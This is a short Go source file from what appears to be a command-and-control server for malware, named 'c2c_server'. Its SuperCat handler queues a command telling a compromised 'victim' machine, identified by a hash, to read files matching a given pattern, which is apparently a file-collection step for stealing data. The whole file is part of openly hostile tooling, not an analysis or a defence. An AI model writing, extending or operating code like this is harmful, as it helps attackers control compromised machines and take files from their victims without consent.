package handlers

import (
	"assimilate/c2c_server/v2/internal/model"
	"assimilate/c2c_server/v2/internal/types"
)

func SuperCat(state *model.ServerState) types.SuperCatHandlerFunc {
	return func(victimHash string, filePattern string) {
		cmd := types.VictimCommand{
			Commandytype: "supercat",
			Arguments:    []string{filePattern},
		}

		state.AddCommandToVictim(victimHash, cmd)
	}
}
